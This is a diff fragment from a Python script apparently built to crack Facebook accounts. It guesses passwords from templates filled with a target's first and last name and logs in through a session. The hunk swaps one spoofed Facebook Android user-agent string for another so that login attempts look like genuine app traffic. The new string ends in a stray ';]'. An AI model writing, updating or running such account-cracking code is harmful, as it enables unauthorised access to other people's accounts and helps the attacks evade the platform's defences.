@@ -203,7 +203,7 @@ class main_crack():
                 ls = fs
             for pw in psw:
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
-                usa = "FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/358614015;FBDM/{density=2.0,width=720,height=1436};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1808;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;"
+                usa = "FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2176};FBLC/it_IT;FBRV/0;FBCR/vodafone IT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G991B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
                 with requests.Session() as session:
                     data = {"adid": str(uuid.uuid4()),
 "format": "json",
